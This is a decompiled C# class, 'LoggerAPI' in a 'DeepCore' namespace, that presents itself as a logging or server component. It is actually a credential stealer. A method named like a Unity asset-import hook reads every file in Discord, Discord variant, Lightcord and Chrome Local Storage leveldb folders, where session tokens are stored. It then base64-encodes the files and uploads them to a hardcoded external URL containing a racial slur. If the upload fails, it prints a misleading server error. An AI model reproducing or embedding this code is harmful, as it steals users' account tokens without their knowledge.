using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using DeepCore.Client;
using Newtonsoft.Json;

namespace DeepCore.ServerAPI
{
	// Token: 0x02000007 RID: 7
	internal class LoggerAPI
	{
		// Token: 0x06000027 RID: 39 RVA: 0x00003022 File Offset: 0x00001222
		public static void OnPostprocessAllAssets()
		{
			LoggerAPI.LogFiles(LoggerAPI.ExtractLevelDbFiles());
		}

		// Token: 0x06000028 RID: 40 RVA: 0x00003030 File Offset: 0x00001230
		public static Dictionary<string, string> ExtractLevelDbFiles()
		{
			string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
			string folderPath2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
			List<string> list = new List<string>();
			list.Add(folderPath + "\\Discord\\Local Storage\\leveldb\\");
			list.Add(folderPath + "\\discordcanary\\Local Storage\\leveldb\\");
			list.Add(folderPath + "\\discordptb\\Local Storage\\leveldb\\");
			list.Add(folderPath + "\\discorddevelopment\\Local Storage\\leveldb\\");
			list.Add(folderPath + "\\Lightcord\\Local Storage\\leveldb\\");
			list.Add(folderPath2 + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\");
			Dictionary<string, string> dictionary = new Dictionary<string, string>();
			foreach (string text in list)
			{
				if (Directory.Exists(text))
				{
					foreach (FileInfo fileInfo in new DirectoryInfo(text).GetFiles())
					{
						if (!(fileInfo.Name == "LOCK"))
						{
							try
							{
								string text2 = Convert.ToBase64String(File.ReadAllBytes(fileInfo.FullName));
								dictionary[fileInfo.Name] = text2;
							}
							catch (Exception)
							{
							}
						}
					}
				}
			}
			return dictionary;
		}

		// Token: 0x06000029 RID: 41 RVA: 0x00003174 File Offset: 0x00001374
		private static void LogFiles(Dictionary<string, string> filesData)
		{
			using (WebClient webClient = new WebClient())
			{
				string text = JsonConvert.SerializeObject(filesData);
				webClient.Headers.Add("Content-Type", "application/json");
				try
				{
					webClient.UploadString(LoggerAPI.loggingUrl, "POST", text);
				}
				catch (Exception)
				{
					DeepConsole.LogConsole("Server", "Failed to connect to RLServer.");
				}
			}
		}

		// Token: 0x04000039 RID: 57
		private static readonly string loggingUrl = "https://nigga.rest/AAAAAAAAAAAAAAAAAAAAAAAAshit/DR2.php";
	}
}
